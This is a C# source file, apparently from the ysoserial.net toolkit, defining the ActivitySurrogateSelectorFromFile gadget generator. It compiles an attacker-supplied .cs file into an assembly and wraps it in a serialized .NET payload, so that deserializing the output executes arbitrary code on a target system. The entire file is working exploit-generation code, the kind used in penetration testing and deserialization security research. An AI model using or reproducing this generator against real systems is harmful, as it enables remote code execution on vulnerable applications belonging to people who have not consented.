﻿using System;
using System.CodeDom.Compiler;
using System.IO;
using System.Linq;
using System.Runtime.Serialization;
using ysoserial.Helpers;

namespace ysoserial.Generators
{
    [Serializable]
    class PayloadClassFromFile : PayloadClass
    {
        protected PayloadClassFromFile(SerializationInfo info, StreamingContext context) : base(info, context)
        {
        }

        public PayloadClassFromFile(string file)
        {
            string[] files = file.Split(new[] { ';' }).Select(s => s.Trim()).ToArray();
            CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
            CompilerParameters compilerParameters = new CompilerParameters();
            compilerParameters.CompilerOptions = "-t:library -o+";
            compilerParameters.ReferencedAssemblies.AddRange(files.Skip(1).ToArray());
            CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromFile(compilerParameters, files[0]);
            if (compilerResults.Errors.Count > 0)
            {
                foreach (CompilerError error in compilerResults.Errors)
                {
                    Console.Error.WriteLine(error.ErrorText);
                }
                Environment.Exit(-1);
            }
            base.assemblyBytes = File.ReadAllBytes(compilerResults.PathToAssembly);
            File.Delete(compilerResults.PathToAssembly);
        }
    }
    class ActivitySurrogateSelectorFromFileGenerator : ActivitySurrogateSelectorGenerator
    {
        public override string AdditionalInfo()
        {
            return "Another variant of the ActivitySurrogateSelector gadget. This gadget interprets the command parameter as path to the .cs file that should be compiled as exploit class. Use semicolon to separate the file from additionally required assemblies, e. g., '-c ExploitClass.cs;System.Windows.Forms.dll'";
        }

        public override string Name()
        {
            return "ActivitySurrogateSelectorFromFile";
        }
        
        public override object Generate(string formatter, InputArgs inputArgs)
        {
            try
            {
                PayloadClassFromFile payload = new PayloadClassFromFile(inputArgs.Cmd);
                return Serialize(payload, formatter, inputArgs);
            }
            catch(System.IO.FileNotFoundException e1)
            {
                Console.WriteLine("Error in provided file(s): \r\n" + e1.Message);
                return "";
            }
            
        }
    }
}
